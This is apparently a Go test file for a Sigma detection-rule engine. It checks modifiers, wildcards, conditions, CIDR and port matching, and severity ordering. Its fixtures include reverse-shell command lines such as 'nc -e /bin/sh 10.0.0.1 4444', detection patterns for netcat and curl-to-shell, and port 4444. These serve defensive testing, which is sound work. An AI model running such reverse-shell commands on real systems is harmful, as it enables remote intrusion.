package sigma

import (
	"strings"
	"testing"
	"time"

	"defendsec/internal/events"
)

func mustRule(t *testing.T, src string) *Rule {
	t.Helper()
	r, err := Parse([]byte(src))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	return r
}

func procEvent(image, cmdline string) *events.Event {
	e := &events.Event{
		ID: "e1", DeviceID: "dev-1", Kind: events.KindProcess,
		At: time.Now().UTC(), PID: 100, PPID: 1,
	}
	e.Set(events.FieldImage, image)
	e.Set(events.FieldCommandLine, cmdline)
	return e
}

func fires(t *testing.T, r *Rule, e *events.Event) bool {
	t.Helper()
	return r.condition.eval(e, r.selections)
}

// Sigma compares strings case-insensitively. A rule written for one casing
// that silently misses another is the failure mode that makes a detection
// look like a quiet network.
func TestStringComparisonIsCaseInsensitive(t *testing.T) {
	r := mustRule(t, `
title: Curl piped to shell
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith: /curl
  condition: selection
`)
	for _, image := range []string{"/usr/bin/curl", "/USR/BIN/CURL", "/usr/bin/Curl"} {
		if !fires(t, r, procEvent(image, image)) {
			t.Errorf("%q did not match a case-insensitive rule", image)
		}
	}
	if fires(t, r, procEvent("/usr/bin/curly", "x")) {
		t.Error("endswith matched a longer string")
	}
}

// A list of values is an OR; a map of fields is an AND. Getting this backwards
// makes a rule fire on everything or nothing.
func TestListIsOrAndMapIsAnd(t *testing.T) {
	r := mustRule(t, `
title: Shell interpreters
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith:
      - /bash
      - /sh
      - /zsh
  condition: selection
`)
	for _, image := range []string{"/bin/bash", "/bin/sh", "/usr/bin/zsh"} {
		if !fires(t, r, procEvent(image, image)) {
			t.Errorf("%q did not match the value list", image)
		}
	}
	if fires(t, r, procEvent("/bin/dash", "x")) {
		t.Error("a value outside the list matched")
	}

	both := mustRule(t, `
title: Both fields
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith: /bash
    CommandLine|contains: " -c "
  condition: selection
`)
	if !fires(t, both, procEvent("/bin/bash", "/bin/bash -c id")) {
		t.Error("an event satisfying both fields did not match")
	}
	if fires(t, both, procEvent("/bin/bash", "/bin/bash script.sh")) {
		t.Error("a map of fields behaved as OR, not AND")
	}
}

func TestModifiers(t *testing.T) {
	cases := map[string]struct {
		rule    string
		cmdline string
		want    bool
	}{
		"contains matches": {`CommandLine|contains: "base64 -d"`, "echo x | base64 -d", true},
		"contains misses":  {`CommandLine|contains: "base64 -d"`, "echo x", false},
		"startswith":       {`CommandLine|startswith: "/bin/bash"`, "/bin/bash -c id", true},
		"startswith miss":  {`CommandLine|startswith: "/bin/bash"`, "sudo /bin/bash", false},
		"endswith":         {`CommandLine|endswith: ".sh"`, "run /tmp/x.sh", true},
		"regex":            {`CommandLine|re: "nc\\s+-[a-z]*e"`, "nc -lvnpe /bin/sh", true},
		"regex miss":       {`CommandLine|re: "nc\\s+-[a-z]*e"`, "ncdu /home", false},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			r := mustRule(t, `
title: t
logsource:
  category: process_creation
detection:
  selection:
    `+tc.rule+`
  condition: selection
`)
			if got := fires(t, r, procEvent("/bin/bash", tc.cmdline)); got != tc.want {
				t.Errorf("match = %v, want %v", got, tc.want)
			}
		})
	}
}

// |all means every listed value must be present, not any of them. Treating it
// as OR would turn a precise rule into a noisy one.
func TestAllModifier(t *testing.T) {
	r := mustRule(t, `
title: Reverse shell flags
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains|all:
      - "-e"
      - "/bin/sh"
  condition: selection
`)
	if !fires(t, r, procEvent("/usr/bin/nc", "nc -e /bin/sh 10.0.0.1 4444")) {
		t.Error("an event with both values did not match |all")
	}
	if fires(t, r, procEvent("/usr/bin/nc", "nc -e /bin/bash 10.0.0.1")) {
		t.Error("|all matched with only one value present")
	}
}

// Wildcards work in plain values, which a great many community rules rely on.
func TestWildcards(t *testing.T) {
	r := mustRule(t, `
title: Temp execution
logsource:
  category: process_creation
detection:
  selection:
    Image: /tmp/*
  condition: selection
`)
	if !fires(t, r, procEvent("/tmp/payload", "x")) {
		t.Error("a wildcard value did not match")
	}
	if fires(t, r, procEvent("/usr/bin/ls", "x")) {
		t.Error("a wildcard matched outside its prefix")
	}

	single := mustRule(t, `
title: Single char
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/sh?
  condition: selection
`)
	if !fires(t, single, procEvent("/bin/shX", "x")) {
		t.Error("? did not match one character")
	}
	if fires(t, single, procEvent("/bin/sh", "x")) {
		t.Error("? matched zero characters")
	}

	// An escaped wildcard is a literal.
	escaped := mustRule(t, `
title: Literal star
logsource:
  category: process_creation
detection:
  selection:
    CommandLine: 'echo \*'
  condition: selection
`)
	if !fires(t, escaped, procEvent("/bin/echo", "echo *")) {
		t.Error("an escaped wildcard did not match its literal")
	}
	if fires(t, escaped, procEvent("/bin/echo", "echo anything")) {
		t.Error("an escaped wildcard behaved as a wildcard")
	}
}

// A null value matches only when the field is absent. A field present but
// empty and a field absent are different facts.
func TestNullMatchesOnlyAbsentFields(t *testing.T) {
	r := mustRule(t, `
title: No parent
logsource:
  category: process_creation
detection:
  selection:
    ParentImage: null
  condition: selection
`)
	withoutParent := procEvent("/bin/bash", "bash")
	if !fires(t, r, withoutParent) {
		t.Error("an absent field did not match null")
	}

	withParent := procEvent("/bin/bash", "bash")
	withParent.Set(events.FieldParentImage, "/usr/sbin/sshd")
	if fires(t, r, withParent) {
		t.Error("a present field matched null")
	}
}

func TestConditionExpressions(t *testing.T) {
	r := mustRule(t, `
title: Shell not from a known parent
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith: /bash
  filter_sshd:
    ParentImage|endswith: /sshd
  filter_login:
    ParentImage|endswith: /login
  condition: selection and not (filter_sshd or filter_login)
`)
	suspicious := procEvent("/bin/bash", "bash")
	suspicious.Set(events.FieldParentImage, "/usr/bin/nginx")
	if !fires(t, r, suspicious) {
		t.Error("a shell from an unexpected parent did not match")
	}

	for _, parent := range []string{"/usr/sbin/sshd", "/bin/login"} {
		benign := procEvent("/bin/bash", "bash")
		benign.Set(events.FieldParentImage, parent)
		if fires(t, r, benign) {
			t.Errorf("parent %q was not filtered out", parent)
		}
	}
}

func TestQuantifiedConditions(t *testing.T) {
	src := `
title: t
logsource:
  category: process_creation
detection:
  sel_a:
    Image|endswith: /nc
  sel_b:
    CommandLine|contains: " -e "
  other:
    CommandLine|contains: zzz
  condition: %s
`
	both := procEvent("/usr/bin/nc", "nc -e /bin/sh")
	onlyA := procEvent("/usr/bin/nc", "nc 10.0.0.1")

	allOf := mustRule(t, strings.Replace(src, "%s", "all of sel_*", 1))
	if !fires(t, allOf, both) {
		t.Error("all of sel_* did not match when both selections did")
	}
	if fires(t, allOf, onlyA) {
		t.Error("all of sel_* matched with only one selection satisfied")
	}

	oneOf := mustRule(t, strings.Replace(src, "%s", "1 of sel_*", 1))
	if !fires(t, oneOf, onlyA) {
		t.Error("1 of sel_* did not match a single satisfied selection")
	}

	them := mustRule(t, strings.Replace(src, "%s", "1 of them", 1))
	if !fires(t, them, onlyA) {
		t.Error("1 of them did not match")
	}

	allThem := mustRule(t, strings.Replace(src, "%s", "all of them", 1))
	if fires(t, allThem, both) {
		t.Error("all of them matched when the 'other' selection did not")
	}
}

// A rule the engine cannot faithfully evaluate must be refused, not compiled
// into something that fires on the wrong events.
func TestUnsupportedFeaturesAreRefused(t *testing.T) {
	cases := map[string]string{
		"aggregation": `
title: t
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/su
  condition: selection | count() > 5
`,
		"unknown modifier": `
title: t
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|utf16le|contains: x
  condition: selection
`,
		"missing selection": `
title: t
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/sh
  condition: selection and filter
`,
		"no condition": `
title: t
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/sh
`,
		"no detection": `
title: t
logsource:
  category: process_creation
`,
		"no title": `
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/sh
  condition: selection
`,
		"unbalanced parenthesis": `
title: t
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/sh
  condition: (selection and not selection
`,
		"empty value list": `
title: t
logsource:
  category: process_creation
detection:
  selection:
    Image: []
  condition: selection
`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Parse([]byte(src)); err == nil {
				t.Error("accepted")
			}
		})
	}
}

// An unknown modifier changes what a rule means: dropping |base64 turns a
// search for encoded text into a search for plain text, which matches nothing.
func TestUnknownModifierNamesItself(t *testing.T) {
	_, err := Parse([]byte(`
title: t
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|utf16le: x
  condition: selection
`))
	if err == nil {
		t.Fatal("an unknown modifier was accepted")
	}
	if !strings.Contains(err.Error(), "utf16le") {
		t.Errorf("the error does not name the modifier: %v", err)
	}
}

func TestCIDRModifier(t *testing.T) {
	r := mustRule(t, `
title: External connection
logsource:
  category: network_connection
detection:
  internal:
    DestinationIp|cidr:
      - 10.0.0.0/8
      - 192.168.0.0/16
      - 127.0.0.0/8
  condition: not internal
`)
	external := &events.Event{ID: "e", Kind: events.KindNetwork, At: time.Now()}
	external.Set(events.FieldDestinationIP, "8.8.8.8")
	if !fires(t, r, external) {
		t.Error("an external address was treated as internal")
	}

	for _, addr := range []string{"10.1.2.3", "192.168.1.5", "127.0.0.1"} {
		internal := &events.Event{ID: "e", Kind: events.KindNetwork, At: time.Now()}
		internal.Set(events.FieldDestinationIP, addr)
		if fires(t, r, internal) {
			t.Errorf("%s was not recognised as internal", addr)
		}
	}
}

// Ports arrive as numbers from the sensor and as numbers in YAML; both must
// compare equal to each other.
func TestNumericFieldsCompareAsText(t *testing.T) {
	r := mustRule(t, `
title: Common reverse shell port
logsource:
  category: network_connection
detection:
  selection:
    DestinationPort: 4444
  condition: selection
`)
	for _, port := range []any{4444, int32(4444), int64(4444), float64(4444), "4444"} {
		e := &events.Event{ID: "e", Kind: events.KindNetwork, At: time.Now()}
		e.Set(events.FieldDestinationPort, port)
		if !fires(t, r, e) {
			t.Errorf("port %v (%T) did not match", port, port)
		}
	}

	e := &events.Event{ID: "e", Kind: events.KindNetwork, At: time.Now()}
	e.Set(events.FieldDestinationPort, 443)
	if fires(t, r, e) {
		t.Error("a different port matched")
	}
}

// A multi-valued field matches when any of its values does. Joining them into
// one string would make a rule for "-e" match "-exec".
func TestMultiValuedFields(t *testing.T) {
	r := mustRule(t, `
title: t
logsource:
  category: process_creation
detection:
  selection:
    Capability: cap_sys_admin
  condition: selection
`)
	e := procEvent("/bin/x", "x")
	e.Set(events.FieldCapability, []string{"cap_net_raw", "cap_sys_admin"})
	if !fires(t, r, e) {
		t.Error("a value inside a list field did not match")
	}

	e2 := procEvent("/bin/x", "x")
	e2.Set(events.FieldCapability, []string{"cap_net_raw"})
	if fires(t, r, e2) {
		t.Error("a list field matched a value it does not contain")
	}
}

func TestATTACKTags(t *testing.T) {
	r := mustRule(t, `
title: t
tags:
  - attack.execution
  - attack.t1059.004
  - attack.t1071
  - attack.defense_evasion
  - cve.2024.1234
logsource:
  category: process_creation
detection:
  selection:
    Image: /bin/sh
  condition: selection
`)
	techniques := r.Techniques()
	if len(techniques) != 2 || techniques[0] != "T1059.004" || techniques[1] != "T1071" {
		t.Errorf("techniques = %v", techniques)
	}
	tactics := r.Tactics()
	if len(tactics) != 2 {
		t.Errorf("tactics = %v", tactics)
	}
}

func TestEngineRoutesByCategory(t *testing.T) {
	set := &RuleSet{rules: []*Rule{
		mustRule(t, `
title: Process rule
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith: /nc
  condition: selection
`),
		mustRule(t, `
title: Network rule
logsource:
  category: network_connection
detection:
  selection:
    DestinationPort: 4444
  condition: selection
`),
	}}
	e := NewEngine(set)

	proc := procEvent("/usr/bin/nc", "nc -e /bin/sh")
	matches := e.Match(proc)
	if len(matches) != 1 || matches[0].RuleTitle != "Process rule" {
		t.Fatalf("process event matched %+v", matches)
	}
	// The network rule must not be evaluated against a process event: with
	// thousands of rules that is the difference between a sensor and an
	// outage.
	net := &events.Event{ID: "e", Kind: events.KindNetwork, At: time.Now()}
	net.Set(events.FieldDestinationPort, 4444)
	matches = e.Match(net)
	if len(matches) != 1 || matches[0].RuleTitle != "Network rule" {
		t.Fatalf("network event matched %+v", matches)
	}
}

// Most severe first: an analyst reading a burst should see what matters.
func TestMatchesAreOrderedBySeverity(t *testing.T) {
	set := &RuleSet{rules: []*Rule{
		mustRule(t, "title: Low\nlevel: low\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: /nc\n  condition: selection\n"),
		mustRule(t, "title: Critical\nlevel: critical\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: /nc\n  condition: selection\n"),
		mustRule(t, "title: Medium\nlevel: medium\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: /nc\n  condition: selection\n"),
	}}
	matches := NewEngine(set).Match(procEvent("/usr/bin/nc", "nc"))
	if len(matches) != 3 {
		t.Fatalf("matched %d rules", len(matches))
	}
	if matches[0].Level != LevelCritical || matches[2].Level != LevelLow {
		t.Errorf("order = %v, %v, %v", matches[0].Level, matches[1].Level, matches[2].Level)
	}
}

// A match has to carry what an analyst needs at that moment, not a pointer to
// a file they have to go and find.
func TestMatchCarriesContext(t *testing.T) {
	set := &RuleSet{rules: []*Rule{mustRule(t, `
title: Suspicious
id: 11111111-2222-3333-4444-555555555555
level: high
description: A shell was spawned by a web server, which is how a web shell looks.
falsepositives:
  - Deployment scripts run from the web server user
tags:
  - attack.t1059.004
logsource:
  category: process_creation
detection:
  selection:
    Image|endswith: /bash
  condition: selection
`)}}
	matches := NewEngine(set).Match(procEvent("/bin/bash", "bash -i"))
	if len(matches) != 1 {
		t.Fatalf("matches = %d", len(matches))
	}
	m := matches[0]
	if m.RuleID == "" || m.RuleHash == "" || m.Description == "" ||
		len(m.FalsePositives) != 1 || len(m.Techniques) != 1 {
		t.Errorf("match is missing context: %+v", m)
	}
	if m.Event == nil || m.Event.ID != "e1" {
		t.Error("the match does not carry its event")
	}
}
